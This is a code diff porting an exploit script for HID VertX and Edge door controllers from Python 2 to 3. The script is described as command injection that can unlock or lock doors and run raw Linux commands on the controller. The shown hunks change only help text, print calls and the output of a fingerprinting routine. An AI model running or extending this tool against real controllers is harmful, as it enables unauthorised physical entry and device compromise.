@@ -8,8 +8,8 @@
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
 #
-# The above copyright notice and this permission notice shall be included in
-# all copies or substantial portions of the Software.
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
 #
 # THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
@@ -24,10 +24,10 @@ from socket import *
 
 
 def main():
-	parser = argparse.ArgumentParser(description='Command Injection on HID VertX and Edge Door Controllers')
+	parser = argparse.ArgumentParser(description='Command injection on HID VertX and Edge door controllers')
 	parser.add_argument('-i', '--ip', help='IP address of VertX controller, (default 255.255.255.255)', default='255.255.255.255', required=False)
 	parser.add_argument('-p', '--port', help='Port of VertX controller, (default 4070)', default=4070, type=int, required=False)
-	parser.add_argument('--action', help='Unlock or lock or doors', choices=['unlock', 'lock'], default=None, required=False)
+	parser.add_argument('--action', help='Unlock or lock doors', choices=['unlock', 'lock'], default=None, required=False)
 	parser.add_argument('--raw', help='Raw Linux command as payload (example: ping -c 5 IP_ADDRESS)', action='store_true', required=False)
 	args = parser.parse_args()
 
@@ -75,14 +75,20 @@ def main():
 # Get information about VertX controller
 def fingerprint_controller(data):
 	response_data = data[0].split(';')
+	vuln_status = check_version(response_data[7])
+
 	print_good("VertX Controller Information")
-	print "RAW (ASCII): {0}".format(data)
-	print "Name: {0}".format(response_data[3])
-	print "Model: {0}".format(response_data[6])
-	print "Version: {0} - ({1})".format(response_data[7], response_data[8])
-	print "IP Address: {0}".format(response_data[4])
-	print "MAC Address: {0}".format(response_data[2])
-	print "Vulnerable: {0}\n".format(check_version(response_data[7]))
+	print("RAW (ASCII): {0}".format(data))
+	print("Name: {0}".format(response_data[3]))
+	print("Model: {0}".format(response_data[6]))
+	print("Version: {0} - ({1})".format(response_data[7], response_data[8]))
+	print("IP Address: {0}".format(response_data[4]))
+	print("MAC Address: {0}".format(response_data[2]))
+
+	if vuln_status:
+		print("Vulnerable: \033[1m\033[32mTrue\033[0m")
+	else:
+		print("Vulnerable: \033[1m\033[33mFalse\033[0m")
 
 	return response_data[2], response_data[6]
 
@@ -174,19 +180,19 @@ def chunk_string(command, length):
 
 
 def print_error(msg):
-	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
+	print("\033[1m\033[31m[-]\033[0m {0}".format(msg))
 
 
 def print_status(msg):
-	print "\033[1m\033[34m[*]\033[0m {0}".format(msg)
+	print("\033[1m\033[34m[*]\033[0m {0}".format(msg))
 
 
 def print_good(msg):
-	print "\033[1m\033[32m[+]\033[0m {0}".format(msg)
+	print("\033[1m\033[32m[+]\033[0m {0}".format(msg))
 
 
 def print_warn(msg):
-	print "\033[1m\033[33m[!]\033[0m {0}".format(msg)
+	print("\033[1m\033[33m[!]\033[0m {0}".format(msg))
 
 if __name__ == '__main__':
 	main()
